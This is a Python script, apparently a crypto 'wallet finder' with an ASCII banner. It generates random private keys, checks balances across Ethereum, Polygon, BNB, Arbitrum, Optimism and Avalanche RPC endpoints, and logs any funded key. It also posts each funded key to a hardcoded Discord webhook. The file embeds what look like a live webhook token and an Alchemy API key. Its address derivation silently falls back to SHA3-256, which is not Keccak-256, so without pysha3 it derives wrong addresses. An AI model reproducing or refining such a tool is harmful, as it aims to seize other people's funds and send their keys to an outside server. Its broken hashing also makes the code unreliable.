import secrets
import requests
import time
import hashlib
import json
from ecdsa import SigningKey, SECP256k1
from concurrent.futures import ThreadPoolExecutor
import threading
import sys

RED = "\033[91m"
GREEN = "\033[92m"
RESET = "\033[0m"

WEBHOOK_URL = "https://discord.com/api/webhooks/1370714262237876224/od1EsdVEJ869kBHZB7vqGqXjOM55pcaK9NbPf_J97AUY5GFnHrVsRVcO-qB0oXY_012a"

RPC_ENDPOINTS = {
    "ETH": "https://eth-mainnet.g.alchemy.com/v2/kXg5eHzREfbkY0c7uxkdGOIRnjxHqby-",
    "POLYGON": "https://polygon-rpc.com",
    "BNB": "https://bsc-dataseed.binance.org/",
    "ARBITRUM": "https://arb1.arbitrum.io/rpc",
    "OPTIMISM": "https://mainnet.optimism.io",
    "AVAX": "https://api.avax.network/ext/bc/C/rpc"
}

BANNER_LINES = [
    "███╗░░░███╗░██████╗██╗░░██╗██╗░░░░░██╗░░░██╗",
    "████╗░████║██╔════╝╚██╗██╔╝██║░░░░░██║░░░██║",
    "██╔████╔██║╚█████╗░░╚███╔╝░██║░░░░░╚██╗░██╔╝",
    "██║╚██╔╝██║░╚═══██╗░██╔██╗░██║░░░░░░╚████╔╝░",
    "██║░╚═╝░██║██████╔╝██╔╝╚██╗███████╗░░╚██╔╝░░",
    "╚═╝░░░░░╚═╝╚═════╝░╚═╝░░╚═╝╚══════╝░░░╚═╝░░░"
]

TERMINAL_WIDTH = 120
LEFT_COL_WIDTH = 70
RIGHT_COL_START = LEFT_COL_WIDTH + 2
MAX_SCAN_LINES = 30  # how many scan lines visible on left

print_lock = threading.Lock()

def print_banner():
    with print_lock:
        print(RED)
        for line in BANNER_LINES:
            print(line.ljust(TERMINAL_WIDTH))
        print(RESET)

def generate_private_key():
    return secrets.token_hex(32)

def private_key_to_address(private_key_hex):
    private_key_bytes = bytes.fromhex(private_key_hex)
    sk = SigningKey.from_string(private_key_bytes, curve=SECP256k1)
    vk = sk.verifying_key
    pub_key = b'\x04' + vk.to_string()
    try:
        import sha3
        keccak_hash = sha3.keccak_256(pub_key).digest()
    except ImportError:
        keccak_hash = hashlib.sha3_256(pub_key).digest()
    return "0x" + keccak_hash[-20:].hex()

def check_balance(address, chain_rpc):
    chain, rpc_url = chain_rpc
    headers = {"Content-Type": "application/json"}
    data = {
        "jsonrpc": "2.0",
        "method": "eth_getBalance",
        "params": [address, "latest"],
        "id": 1
    }
    try:
        response = requests.post(rpc_url, headers=headers, data=json.dumps(data), timeout=10)
        result = response.json()
        wei = int(result.get("result", "0x0"), 16)
        return chain, wei / 10**18
    except Exception:
        return chain, 0

def send_to_discord(message):
    try:
        requests.post(WEBHOOK_URL, json={"content": message})
    except Exception as e:
        with print_lock:
            print(f"Failed to send Discord message: {e}")

def move_cursor(row, col):
    print(f"\033[{row};{col}H", end='')

def clear_screen():
    print("\033[2J", end='')
    print("\033[H", end='')

def clear_left_panel(start_row, lines):
    for i in range(lines):
        move_cursor(start_row + i, 1)
        print(" " * (LEFT_COL_WIDTH - 1))

def clear_right_panel(start_row, lines):
    for i in range(lines):
        move_cursor(start_row + i, RIGHT_COL_START)
        print(" " * (TERMINAL_WIDTH - RIGHT_COL_START))

def main():
    clear_screen()
    print_banner()
    banner_height = len(BANNER_LINES)
    left_start = banner_height + 1
    right_start = banner_height + 1

    scan_lines = []
    found_wallets = []

    try:
        while True:
            batch_keys = []
            for _ in range(10):
                priv_key = generate_private_key()
                address = private_key_to_address(priv_key)
                batch_keys.append((address, priv_key))

            # Check balances concurrently
            with ThreadPoolExecutor(max_workers=len(RPC_ENDPOINTS) * 10) as executor:
                futures = []
                for address, priv_key in batch_keys:
                    for item in RPC_ENDPOINTS.items():
                        futures.append(executor.submit(check_balance, address, item))
                results_raw = [f.result() for f in futures]

            # Organize results by address
            results_by_address = {}
            idx = 0
            for address, priv_key in batch_keys:
                chain_balances = {}
                for _ in RPC_ENDPOINTS:
                    chain, bal = results_raw[idx]
                    chain_balances[chain] = bal
                    idx += 1
                results_by_address[address] = (priv_key, chain_balances)

            # Update scan lines for left panel
            for address, (priv_key, chain_balances) in results_by_address.items():
                scan_lines.append(f"Checking: {address[:42]}")
                if len(scan_lines) > MAX_SCAN_LINES:
                    scan_lines.pop(0)

            # Clear and redraw left panel
            clear_left_panel(left_start, MAX_SCAN_LINES)
            with print_lock:
                for i, line in enumerate(scan_lines):
                    move_cursor(left_start + i, 1)
                    print(line.ljust(LEFT_COL_WIDTH - 1))

            # Check for any wallets with balance > 0
            new_found = False
            for address, (priv_key, chain_balances) in results_by_address.items():
                if any(bal > 0 for bal in chain_balances.values()):
                    found_wallets.append({
                        "address": address,
                        "priv_key": priv_key,
                        "balances": chain_balances,
                    })
                    new_found = True
                    with open("keys.txt", "a") as f:
                        f.write(f"{address} : 0x{priv_key}\n")

                    # Send Discord notification
                    msg = f"💰 **Balance found!**\nAddress: `{address}`\n"
                    for chain, bal in chain_balances.items():
                        status = "🟢" if bal > 0 else "🔴"
                        msg += f"{status} {chain}: {bal:.6f}\n"
                    msg += f"Private Key: ||0x{priv_key}||"
                    send_to_discord(msg)

            # If new wallets found, redraw right panel
            if new_found:
                clear_right_panel(right_start, 40)
                with print_lock:
                    move_cursor(right_start, RIGHT_COL_START)
                    print(f"{RED}=== BALANCE FOUND ==={RESET}")
                    line_num = right_start + 1
                    for wallet in found_wallets[-20:]:
                        move_cursor(line_num, RIGHT_COL_START)
                        print(wallet["address"][:42])
                        line_num += 1
                        for chain, bal in wallet["balances"].items():
                            color = GREEN if bal > 0 else RED
                            move_cursor(line_num, RIGHT_COL_START)
                            print(f"  {chain}: {color}{bal:.6f}{RESET}")
                            line_num += 1
                        move_cursor(line_num, RIGHT_COL_START)
                        print(f"  PrivKey: 0x{wallet['priv_key'][:10]}...")
                        line_num += 2

            time.sleep(0.5)

    except KeyboardInterrupt:
        move_cursor(banner_height + MAX_SCAN_LINES + 2, 0)
        print("\nStopped by user.")

if __name__ == "__main__":
    main()
